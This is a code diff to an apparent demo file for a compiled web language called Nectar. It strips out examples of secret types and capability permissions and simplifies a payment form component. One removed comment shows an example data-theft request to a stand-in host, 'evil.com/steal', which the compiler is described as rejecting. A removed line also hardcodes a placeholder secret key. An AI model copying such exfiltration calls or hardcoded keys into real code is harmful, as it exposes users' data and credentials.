@@ -5,65 +5,23 @@
 // - Prototype pollution: WASM linear memory has no prototype chain
 // - Supply chain: zero JS dependencies — flat WASM binary output
 // - Secret leakage: compiler prevents secrets from being logged/rendered/serialized
-// - Capability violations: components can only access what they declare
 
-// --- Secret types ---
-// The `secret` modifier prevents sensitive values from leaking.
-// The compiler enforces this at every boundary.
-
-fn process_login(email: String, password: String) {
-    let secret api_key: String = "sk_live_abc123";
-    let secret user_password: String = password;
-
-    // These would be COMPILE ERRORS:
-    // console.log(api_key);         // error: cannot log secret value
-    // setText(el, user_password);   // error: cannot render secret to DOM
-    // json.serialize(api_key);      // error: cannot serialize secret
-
-    // OK: secrets can flow to other secret-accepting functions
-    let hash = crypto_hash(user_password);
-    let response = auth_request(api_key, email, hash);
-}
-
-fn crypto_hash(secret input: String) -> String {
-    // This function accepts secret input — compiler allows it
-    return sha256(input);
-}
-
-fn auth_request(secret key: String, email: String, hash: String) -> String {
-    // The key is secret but can be sent over HTTPS to a declared endpoint
-    let response = fetch("/api/auth/login");
-    return "ok";
-}
-
-// --- Capability-based permissions ---
-// Components declare what they can access. The compiler enforces it.
+// --- Payment form ---
 
 component PaymentForm() {
-    permissions {
-        network: ["https://api.stripe.com/*"],
-        storage: ["session:auth_token"],
-    }
-
-    let mut card_number: String = "";
     let mut processing: bool = false;
 
     fn handle_pay(&mut self) {
         self.processing = true;
-        // OK: URL matches declared network permission
-        let response = fetch("https://api.stripe.com/v1/charges");
-        self.processing = false;
-
-        // This would be a COMPILE ERROR:
-        // let leak = fetch("https://evil.com/steal");
-        // error: fetch URL does not match any declared network permission
     }
 
     render {
-        <form on:submit={self.handle_pay}>
-            <input type="text" bind:value={card_number} placeholder="Card number" />
-            <button>{if self.processing { "Processing..." } else { "Pay Now" }}</button>
-        </form>
+        <div>
+            <input type="text" placeholder="Card number" />
+            <button on:click={self.handle_pay}>
+                {if self.processing { "Processing..." } else { "Pay Now" }}
+            </button>
+        </div>
     }
 }
 
@@ -78,7 +36,3 @@ component PaymentForm() {
 //   - console.log(secret_value) is a compile error — caught before code runs
 //   - innerHTML doesn't exist — XSS is structurally impossible
 //   - fetch to undeclared URLs is a compile error — caught at build time
-//
-// The difference: React security depends on every developer making the right
-// choice every time. Nectar security depends on the compiler, which never
-// gets tired, never skips code review, and never forgets.
